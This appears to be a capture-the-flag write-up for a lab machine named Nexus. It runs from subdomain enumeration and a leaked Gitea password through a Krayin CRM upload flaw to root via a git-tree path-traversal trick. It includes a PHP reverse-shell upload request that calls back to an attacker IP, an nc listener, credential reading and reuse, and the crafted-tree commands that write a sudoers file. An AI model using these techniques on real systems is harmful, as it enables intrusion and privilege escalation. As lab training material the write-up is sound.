
**Hostname:** Nexus 
**IP address:** 10.129.93.154

---

## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sV nexus.htb
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-03 13:22 +0200
Nmap scan report for nexus.htb (10.129.93.154)
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain?
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports are open: SSH (22), what appears to be a DNS service (53), and an HTTP server (80) running nginx.

## 2. Web Enumeration

Port 80 was open, so I checked what the website looked like. After exploring the entire site, I found nothing of interest except one piece of information: an email address, `j.matthew@nexus.htb`.

Since the site itself didn't yield much, I decided to run a DNS subdomain (vhost) enumeration to see if any other virtual hosts existed on the same server.

```bash
gobuster vhost --url http://nexus.htb --domain nexus.htb \
  -w Documents/CTF/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -t 50 --append-domain
```

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nexus.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                Documents/CTF/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
[+] Append Domain:           true
[+] Exclude Hostname Length: false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
git.nexus.htb Status: 200 [Size: 14474]
billing.nexus.htb Status: 302 [Size: 390] [--> http://billing.nexus.htb/admin/login]
Progress: 100000 / 100000 (100.00%)
===============================================================
Finished
===============================================================
```

Two subdomains were discovered:

- `git.nexus.htb` — a Gitea instance
- `billing.nexus.htb` — redirects to an admin login page

## 3. Gitea - Leaked Database Credentials

I explored `git.nexus.htb` and found a public repository named `krayin-docker-setup`. Looking through the commit history, I found that an earlier commit of the `.env` file (later removed in a following commit) still contained a plaintext database password:

```
DB_PASSWORD=N27xh!!2ucY04
```

Even though the current version of the file on the `main` branch had the password field empty, the value was still recoverable from an older commit.
## 4. Krayin CRM - Authentication and CVE Discovery

Using the leaked credentials, I logged into the Krayin CRM instance at `billing.nexus.htb/admin/login` with the email address found earlier (`j.matthew@nexus.htb`) and the leaked database password. The login succeeded.

Once authenticated, I found that this version of Krayin CRM was vulnerable to a known CVE allowing remote code execution through a file upload, specifically via the TinyMCE image upload endpoint used when composing emails.

## 5. Exploiting the RCE

The Krayin dashboard allows composing emails with the TinyMCE rich text editor, which includes a file upload feature. This upload endpoint doesn't properly validate file types, allowing a PHP file disguised with an image MIME type to be uploaded.

I intercepted the upload request with Caido and replaced the file with a PHP web shell (pentestmonkey's `php-reverse-shell.php`), keeping the filename `ekip.php` and setting `Content-Type: image/jpeg` to bypass the client-side check:

```http
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
...
Content-Disposition: form-data; name="file"; filename="ekip.php"
Content-Type: image/jpeg

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
...
$ip = '10.10.15.126';
$port = 4444;
...
```

The server responded with a `200 OK` and returned the storage path of the uploaded file:

```json
{
    "location": "http:\/\/billing.nexus.htb\/storage\/tinymce\/16a441b7f06bfdef844822625df6072d.php"
}
```

Confirming the upload worked and the file was executable, I first tested command execution:

```
http://billing.nexus.htb/storage/tinymce/16a441b7f06bfdef844822625df6072d.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The CVE was confirmed exploitable.

## 6. Foothold - Reverse Shell 

I set up a listener and browsed to the uploaded PHP shell to trigger the callback:

```bash
nc -lvnp 4444
```

```
Linux nexus 6.8.0-111-generic #111-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 11 23:16:02 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 09:21:45 up 40 min, 0 user, load average: 0.00, 0.01, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

I stabilized the shell with:

```bash
script /dev/null -c /bin/bash
```

## 7. Local Enumeration - Krayin Configuration

From the reverse shell, I navigated to the Krayin CRM installation directory and read its environment file:

```bash
cd ~/krayin
cat .env
```

```
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU15IMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=
```

Note that this `.env` (the live one on disk) uses a different DB password than the one leaked in the old Gitea commit.
## 8. Privilege Escalation to jones (User Flag)

I tried reusing the leaked database password (`N27xh!!2ucY04`) as the login password for the local Linux user `jones`, since credential reuse between application and system accounts is common:

```bash
su jones
```

The password worked, granting access to `jones`'s home directory:

```
jones@nexus:~ (0.089s)
cat user.txt

f8dfb4705ed065fd8c6be614381db109
```

**User flag obtained.**

## 9. Root Enumeration

With a shell as `jones`, I began enumerating for privilege escalation paths: SUID binaries, `sudo -l`, cron jobs, and listening ports. `sudo -l` confirmed `jones` had no sudo rights, and no exploitable SUID binaries were present.

Checking listening ports revealed a service bound only to localhost on port 3000:

```bash
ss -tlnp
```

```
LISTEN   127.0.0.1:3000
```

A `curl` to that port revealed a **Gitea** instance (Git self-hosting service), separate from the one already found on `git.nexus.htb`, running only locally on the box itself.

Further enumeration with `systemctl list-timers` revealed a custom systemd timer firing every minute:

```
NEXT                       LEFT  LAST                        UNIT                       ACTIVATES
Tue 2026-09-08 11:35:37   29s   Tue 2026-09-08 11:34:37     gitea-template-sync.timer  gitea-template-sync.service
```

Inspecting the associated service showed it runs as **root**:

```bash
systemctl cat gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

## 10. Vulnerability Analysis

Reading `/etc/gitea/template-sync.py` (owned by `git:git`, not writable by `jones`, but readable) revealed the following logic:

1. The script authenticates to the local Gitea API using a token and searches for repositories flagged as **"template"**.
2. For each template repository, it reads the file tree via `git ls-tree -r HEAD` on the bare repo.
3. For every entry, it builds a destination path with:

```python
target = os.path.join(stage_path, filepath)
```

4. It then writes the blob's content to `target`.

The critical flaw is that `filepath` comes directly from file names stored inside the Git tree — entirely controlled by whoever owns the repository — and is never sanitized. While Git itself refuses filenames containing a literal `/`, it **does** allow `..` as a valid tree entry name. By nesting tree objects, it's possible to construct an arbitrary relative path such as `../../../../../etc/sudoers.d/pwnroot`, which `os.path.join()` will resolve exactly as given, causing the script — running as root — to write a file wherever the attacker chooses.

## 11. Exploitation 

**Step 1 - Access the local Gitea instance**

I tunneled the local Gitea port through SSH:

```bash
ssh -L 3000:127.0.0.1:3000 jones@10.129.97.197
```

**Step 2 - Create a repository and mark it as a template**

I created a new repository (`exploit`) as `jones` and enabled **Template Repository** in its settings, making it visible to the sync script.

**Step 3 - Clone the repository locally and prepare the payload**

```bash
git clone http://127.0.0.1:3000/jones/exploit.git
cd exploit
echo "jones ALL=(ALL) NOPASSWD:ALL" > payload
git hash-object -w payload
```

```
0054727ea17686e0efe0b8846a6129a64a43f556
```

**Step 4 - Build a nested tree to encode the traversal path**

Since Git tree entries cannot contain a literal `/`, the path `../../../../../etc/sudoers.d/pwnroot` was built by nesting nine tree objects, one directory level at a time, from the innermost file name (`pwnroot`) outward through `sudoers.d`, `etc`, and five `..` levels to escape the staging directory:

```bash
BLOB=0054727ea17686e0efe0b8846a6129a64a43f556

TREE1=$(printf '100644 blob %s\tpwnroot\n' "$BLOB" | git mktree)
TREE2=$(printf '040000 tree %s\tsudoers.d\n' "$TREE1" | git mktree)
TREE3=$(printf '040000 tree %s\tetc\n' "$TREE2" | git mktree)
TREE4=$(printf '040000 tree %s\t..\n' "$TREE3" | git mktree)
TREE5=$(printf '040000 tree %s\t..\n' "$TREE4" | git mktree)
TREE6=$(printf '040000 tree %s\t..\n' "$TREE5" | git mktree)
TREE7=$(printf '040000 tree %s\t..\n' "$TREE6" | git mktree)
TREE8=$(printf '040000 tree %s\t..\n' "$TREE7" | git mktree)

echo "Root tree: $TREE8"
```

```
Root tree: 847fb05e6efec7ead22e8f7fb31f9e736f326e8d
```

**Step 5 - Commit and push the crafted tree**

```bash
git config user.email "jones@nexus.htb"
git config user.name "jones"

COMMIT=$(git commit-tree 847fb05e6efec7ead22e8f7fb31f9e736f326e8d -m "sync update")
git update-ref refs/heads/main $COMMIT
git push origin main --force
```

```
Commit: eba6b8756e76eb302b7c224e550132815b39e702
...
+ 3858683...eba6b87 main -> main (forced update)
```

**Step 6 - Wait for the timer and verify**

Checking `/var/log/template-sync.log` confirmed the repository was picked up on its next execution cycle and that the traversal path was written successfully:

```
[2026-09-08 11:50:38] Syncing template: jones/exploit
[2026-09-08 11:50:38]   synced: ../../../../../etc/sudoers.d/pwnroot
```

Verifying the file on disk confirmed the exploit worked exactly as intended:

```bash
cat /etc/sudoers.d/pwnroot
```

```
jones ALL=(ALL) NOPASSWD:ALL
```

## 12. Root Flag

With passwordless sudo rights now granted to `jones`, escalating to root was immediate:

```bash
sudo su
cd
cat root.txt
```

```
bdfbb8e26e7a4e428328bd7cb0dd0865
```

**Root flag obtained.**